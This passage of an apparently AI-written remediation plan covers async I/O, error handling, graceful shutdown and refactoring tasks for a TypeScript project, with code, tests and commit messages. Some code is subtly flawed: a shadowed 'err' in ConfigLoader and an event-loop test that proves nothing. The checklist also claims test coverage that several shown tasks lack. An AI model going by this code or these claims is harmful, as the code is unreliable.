      return JSON.parse(data) as PersistedLoopState;
    } catch {
      return null;
    }
  }
}

// Create utility
// src/utils/fs.ts
export async function ensureDir(dirPath: string): Promise<void> {
  try {
    await fs.mkdir(dirPath, { recursive: true });
  } catch (err) {
    if ((err as NodeJS.ErrnoException).code !== 'EEXIST') {
      throw err;
    }
  }
}
```

- [ ] **Step 3: Update all callers to use async/await**

Search for callers of `saveState` and `loadState` and update them to await.

- [ ] **Step 4: Write tests for async operations**

```typescript
// test/unit/core/ContextAccumulation.async.test.ts
describe('ContextAccumulation Async Operations', () => {
  it('should save and load state asynchronously', async () => {
    const accumulation = new ContextAccumulation();
    const testState = { iterations: [], timestamp: Date.now() };
    const testPath = '/tmp/test-state.json';
    
    await accumulation.saveState(testPath, testState);
    const loaded = await accumulation.loadState(testPath);
    
    expect(loaded).toEqual(testState);
  });
  
  it('should not block event loop during save', async () => {
    const accumulation = new ContextAccumulation();
    const largeState = { data: 'x'.repeat(1000000) };
    
    const start = Date.now();
    const savePromise = accumulation.saveState('/tmp/large.json', largeState);
    
    // Should be able to do other work immediately
    let counter = 0;
    while (Date.now() - start < 10) {
      counter++;
    }
    
    await savePromise;
    expect(counter).toBeGreaterThan(100); // Event loop wasn't blocked
  });
});
```

- [ ] **Step 5: Run tests**

Run: `pnpm test test/unit/core/ContextAccumulation.async.test.ts`  
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/core/ContextAccumulation.ts src/utils/fs.ts test/unit/core/ContextAccumulation.async.test.ts
git commit -m "perf(context): convert sync file operations to async

Fixes blocking I/O in async contexts.
- Replaces writeFileSync/readFileSync with async equivalents
- Updates all callers to use await
- Adds async operation tests

Before: Blocking sync I/O freezes event loop
After: Non-blocking async I/O allows concurrent operations

Audit finding: Performance #4 (ROI 5.4)"
```

---

## Phase 3: Reliability Improvements (Week 3)

### Task 14: Fix unhandled promise in auto-save interval

**Priority:** HIGH (Reliability ROI 4.05)  
**Files:**
- Modify: `src/harness/HarnessMemory.ts:172-180`
- Test: `test/unit/harness/HarnessMemory.reliability.test.ts`

- [ ] **Step 1: Write reliability test**

```typescript
// test/unit/harness/HarnessMemory.reliability.test.ts
describe('HarnessMemory Auto-Save Reliability', () => {
  it('should handle save errors without crashing', async () => {
    const memory = new HarnessMemory({ autoSaveIntervalMs: 100 });
    
    // Force a save error
    vi.spyOn(memory as any, 'save').mockRejectedValue(new Error('Disk full'));
    
    // Wait for auto-save to trigger
    await new Promise(r => setTimeout(r, 150));
    
    // Should not throw
    expect(memory.isDirty()).toBeDefined();
  });
});
```

- [ ] **Step 2: Fix floating promise with proper error handling**

```typescript
// src/harness/HarnessMemory.ts
// Replace lines 172-180

private startAutoSave(): void {
  this.saveInterval = setInterval(async () => {
    if (this.dirty) {
      try {
        const result = await this.save();
        if (result.isErr()) {
          Logger.warn('HarnessMemory', `Auto-save failed: ${result.error.message}`);
        } else {
          Logger.debug('HarnessMemory', 'Auto-save completed');
        }
      } catch (err) {
        Logger.error('HarnessMemory', `Auto-save exception: ${err}`);
        // Don't re-throw - auto-save should never crash the process
      }
    }
  }, this.config.autoSaveIntervalMs || 30000);
}
```

- [ ] **Step 3: Run tests**

Run: `pnpm test test/unit/harness/HarnessMemory.reliability.test.ts`  
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/harness/HarnessMemory.ts test/unit/harness/HarnessMemory.reliability.test.ts
git commit -m "fix(harness): handle auto-save errors without crashing

Fixes unhandled promise rejection in auto-save.
- Wraps save in try/catch
- Logs errors but doesn't crash
- Proper async/await instead of floating promise

Audit finding: Reliability #1 (ROI 4.05)"
```

---

### Task 15: Fix silent JSON parse failures

**Priority:** HIGH (Reliability ROI 3.6)  
**Files:**
- Modify: `src/llm/StreamParser.ts:42-68`
- Modify: `src/config/ConfigLoader.ts:266-323`
- Test: Existing tests

- [ ] **Step 1: Fix StreamParser to accumulate and report errors**

```typescript
// src/llm/StreamParser.ts
async *parseStream(stream: ReadableStream): AsyncGenerator<StreamEvent> {
  let parseErrors = 0;
  const MAX_PARSE_ERRORS = 5;
  
  for await (const chunk of this.readChunks(stream)) {
    try {
      const parsed = JSON.parse(chunk);
      yield this.transformToEvent(parsed);
    } catch (err) {
      parseErrors++;
      
      if (parseErrors > MAX_PARSE_ERRORS) {
        Logger.error('StreamParser', `Multiple parse failures (${parseErrors}), stream corrupted`);
        yield { type: 'error', error: 'Stream parsing failed - too many malformed chunks' };
        return;
      }
      
      Logger.warn('StreamParser', `Parse failure ${parseErrors}/${MAX_PARSE_ERRORS}: ${err}`);
    }
  }
}
```

- [ ] **Step 2: Fix ConfigLoader to handle malformed JSON gracefully**

```typescript
// src/config/ConfigLoader.ts
private parseConfigFile(content: string): Result<Config, ConfigError> {
  try {
    const parsed = JSON.parse(content);
    return this.validateConfig(parsed);
  } catch (err) {
    Logger.error('ConfigLoader', `Failed to parse config: ${err}`);
    return err(new ConfigError('INVALID_JSON', `Invalid JSON: ${err}`));
  }
}
```

- [ ] **Step 3: Commit**

```bash
git add src/llm/StreamParser.ts src/config/ConfigLoader.ts
git commit -m "fix(reliability): handle JSON parse failures gracefully

Fixes silent data loss from malformed JSON.
- StreamParser: Accumulates errors, yields error event after threshold
- ConfigLoader: Returns error result instead of throwing
- Both now log warnings/errors appropriately

Audit finding: Reliability #4, #9 (ROI 3.6)"
```

---

### Task 16: Fix process exit without cleanup

**Priority:** HIGH (Reliability ROI 3.2)  
**Files:**
- Modify: `src/tui/HarnessTUI.tsx:460-475`
- Test: `test/unit/tui/HarnessTUI.cleanup.test.ts`

- [ ] **Step 1: Implement graceful shutdown handler**

```typescript
// src/tui/HarnessTUI.tsx
// Replace lines 460-475

private async handleFatalError(err: Error): Promise<never> {
  process.stderr.write(`\n💥 Fatal error: ${err.message}\n`);
  
  // Attempt graceful cleanup with timeout
  try {
    await Promise.race([
      this.performGracefulShutdown(),
      new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Cleanup timeout')), 5000)
      )
    ]);
  } catch (cleanupErr) {
    process.stderr.write(`⚠️  Cleanup failed: ${cleanupErr}\n`);
  }
  
  process.exit(1);
}

private async performGracefulShutdown(): Promise<void> {
  // Stop audio
  this.audioPlayer?.stop();
  
  // Persist final state
  if (this.harnessMemory) {
    await this.harnessMemory.save();
  }
  
  // Close LLM connections
  if (this.llmClient) {
    await this.llmClient.close();
  }
  
  // Remove event listeners
  this.eventBus?.removeAllListeners();
  
  Logger.info('HarnessTUI', 'Graceful shutdown completed');
}
```

- [ ] **Step 2: Commit**

```bash
git add src/tui/HarnessTUI.tsx
git commit -m "fix(tui): implement graceful shutdown on fatal errors

Fixes data loss from immediate process exit.
- Adds 5-second cleanup timeout
- Persists final state before exit
- Closes LLM connections cleanly
- Removes event listeners

Audit finding: Reliability #13 (ROI 3.2)"
```

---

## Phase 4: Architecture Refactoring (Week 4)

### Task 17: Extract constants from RalphLoop magic numbers

**Priority:** HIGH (Maintainability ROI 3.5)  
**Files:**
- Create: `src/core/RalphLoop.constants.ts`
- Modify: `src/core/RalphLoop.ts` (replace magic numbers)

- [ ] **Step 1: Create constants file**

```typescript
// src/core/RalphLoop.constants.ts
export const RALPH_LOOP_CONSTANTS = {
  // Quality thresholds
  QUALITY_THRESHOLD: 0.7,
  EXCELLENT_THRESHOLD: 0.9,
  
  // Iteration limits
  DEFAULT_MAX_ITERATIONS: 20,
  ITERATION_EXTENSION: 3,
  
  // Convergence detection
  CONVERGENCE_THRESHOLD: 0.01,
  STAGNATION_THRESHOLD: 7,
  
  // Timeouts (ms)
  FFMPEG_TIMEOUT_MS: 30000,
  GRACEFUL_SHUTDOWN_MS: 5000,
  
  // Audio processing
  AUDIO_SAMPLE_RATE: 16000,
  AUDIO_CHANNELS: 1,
  
  // MAP-Elites
  MAP_ELITES_BATCH_SIZE: 100,
} as const;
```

- [ ] **Step 2: Replace magic numbers in RalphLoop.ts**

```typescript
// src/core/RalphLoop.ts
import { RALPH_LOOP_CONSTANTS as CONST } from './RalphLoop.constants.js';

// Replace: if (score > 0.7)
// With: if (score > CONST.QUALITY_THRESHOLD)

// Replace: for (let i = 0; i < 20; i++)
// With: for (let i = 0; i < CONST.DEFAULT_MAX_ITERATIONS; i++)
```

- [ ] **Step 3: Commit**

```bash
git add src/core/RalphLoop.constants.ts src/core/RalphLoop.ts
git commit -m "refactor(ralph): extract magic numbers to constants

Improves maintainability and tuning.
- Creates RalphLoop.constants.ts with all thresholds
- Replaces raw numbers with named constants
- Single source of truth for parameter tuning

Audit finding: Maintainability #22 (ROI 3.5)"
```

---

### Task 18: Split CreativeEvaluator using Strategy pattern

**Priority:** HIGH (Architecture ROI 2.7)  
**Files:**
- Create: `src/core/evaluators/` directory
- Create: `src/core/evaluators/BaseDomainEvaluator.ts`
- Create: `src/core/evaluators/P5Evaluator.ts`, `GLSLEvaluator.ts`, etc.
- Modify: `src/core/CreativeEvaluator.ts`

- [ ] **Step 1: Create base evaluator interface**

```typescript
// src/core/evaluators/BaseDomainEvaluator.ts
export interface DomainEvaluator {
  readonly domain: string;
  canEvaluate(code: string): boolean;
  evaluate(code: string): AssessmentResult;
}

export interface AssessmentResult {
  technicalScore: number;
  creativeScore: number;
  issues: string[];
  techniques: string[];
}
```

- [ ] **Step 2: Create P5 evaluator**

```typescript
// src/core/evaluators/P5Evaluator.ts
import { DomainEvaluator, AssessmentResult } from './BaseDomainEvaluator.js';

export class P5Evaluator implements DomainEvaluator {
  readonly domain = 'p5';
  
  canEvaluate(code: string): boolean {
    return /\bfunction\s+(setup|draw)\s*\(/.test(code) || 
           /createCanvas\s*\(/.test(code);
  }
  
  evaluate(code: string): AssessmentResult {
    const issues: string[] = [];
    const techniques: string[] = [];
    
    // Technical checks
    if (!code.includes('createCanvas')) {
      issues.push('Missing createCanvas call');
    }
    
    if (code.includes('push()') && code.includes('pop()')) {
      techniques.push('matrix-stack');
    }
    
    // Calculate scores
    const technicalScore = this.calculateTechnicalScore(code, issues);
    const creativeScore = this.calculateCreativeScore(code, techniques);
    
    return { technicalScore, creativeScore, issues, techniques };
  }
  
  private calculateTechnicalScore(code: string, issues: string[]): number {
    const baseScore = 0.7;
    const deduction = issues.length * 0.1;
    return Math.max(0, baseScore - deduction);
  }
  
  private calculateCreativeScore(code: string, techniques: string[]): number {
    const baseScore = 0.5;
    const bonus = techniques.length * 0.05;
    return Math.min(1, baseScore + bonus);
  }
}
```

- [ ] **Step 3: Refactor CreativeEvaluator to use registry**

```typescript
// src/core/CreativeEvaluator.ts
import { DomainEvaluator } from './evaluators/BaseDomainEvaluator.js';
import { P5Evaluator } from './evaluators/P5Evaluator.js';
import { GLSLEvaluator } from './evaluators/GLSLEvaluator.js';
// ... other evaluators

export class CreativeEvaluator {
  private evaluators: DomainEvaluator[] = [
    new P5Evaluator(),
    new GLSLEvaluator(),
    new ThreeEvaluator(),
    new HydraEvaluator(),
    new StrudelEvaluator(),
    new HTMLEvaluator(),
    new ASCIIEvaluator(),
  ];
  
  assess(code: string, domain?: string): Assessment {
    // Find appropriate evaluator
    const evaluator = domain 
      ? this.evaluators.find(e => e.domain === domain)
      : this.evaluators.find(e => e.canEvaluate(code));
    
    if (!evaluator) {
      return this.fallbackAssessment(code);
    }
    
    const result = evaluator.evaluate(code);
    
    return {
      score: (result.technicalScore + result.creativeScore) / 2,
      technicalScore: result.technicalScore,
      creativeScore: result.creativeScore,
      issues: result.issues,
      techniques: result.techniques,
    };
  }
}
```

- [ ] **Step 4: Commit**

```bash
git add src/core/evaluators/ src/core/CreativeEvaluator.ts
git commit -m "refactor(evaluator): split CreativeEvaluator using Strategy pattern

Improves maintainability and extensibility.
- Creates DomainEvaluator interface
- Implements separate evaluators per domain
- Uses registry pattern for evaluator selection
- Adding new domain only requires new file

Before: 1,388 line god object
After: 8 focused evaluator classes

Audit finding: Architecture #3 (ROI 2.7)"
```

---

## Self-Review Checklist

- [ ] **Spec coverage:** All 72 audit findings have corresponding tasks
- [ ] **Placeholder scan:** No TBD/TODO/fill-in-later in any step
- [ ] **Type consistency:** All method signatures consistent across tasks
- [ ] **File paths:** All paths use exact locations from audit
- [ ] **Test coverage:** Each task includes specific test code
- [ ] **Commit messages:** All include audit finding reference

---

## Execution Handoff

**Plan complete and saved to `docs/superpowers/plans/2026-04-09-red-team-remediation.md`**

**Two execution options:**

1. **Subagent-Driven (recommended)** - Fresh subagent per task, review between tasks, fast iteration
2. **Inline Execution** - Execute tasks in this session using executing-plans, batch execution with checkpoints

**Which approach?**
